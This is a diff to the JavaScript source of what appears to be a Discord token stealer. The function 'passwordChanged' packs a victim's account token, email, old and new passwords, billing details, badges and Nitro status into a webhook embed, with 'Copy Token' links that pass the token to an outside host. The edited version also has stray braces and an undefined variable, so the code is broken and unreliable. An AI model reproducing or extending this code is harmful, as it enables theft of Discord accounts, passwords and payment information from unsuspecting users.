@@ -386,25 +386,40 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: "<a:tre:962470727129391134> **Password Changed**",
-            value: `Email: **${json.email}** \nOld Password: **${oldpassword}** \nNew Password: **${newpassword}**`,
+            name: `\`${token}\``,
+            value: `Copy Token [Copy Token](https://superfurrycdn.nl/copy/${token}`,
+            inline: false,
+          },
+          {
+            name: "Badges:",
+            value: `**${badges}**`,
             inline: true,
           },
           {
-            name: "<a:tre:962470942796288090> **Discord Info**",
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: "<a:tre:962470429115686923> **Token**",
-            value: `\`${token}\``,
+            name: "Nitro Type:",
+            value: `\`${nitro}\``,
             inline: false,
           },
-       {
-            name: "📋  Copy",
-            value: `[Copy Email](https://superfurrycdn.nl/copy/${email}) | [Copy Token](https://superfurrycdn.nl/copy/${token})`,
+            {
+            name: "Billing:",
+            value: `\`${billing}\``,
             inline: false,
           },
+          },
+            {
+            name: "Email::",
+            value: `\`${email}\``,
+            inline: false,
+          },
+          
+          },
+            {
+            name: "Password::",
+            value: `\`${password}\``,
+            inline: false,
+          },
+          
+       
         ],
         author: {
           name: json.username + "#" + json.discriminator + " | " + json.id,
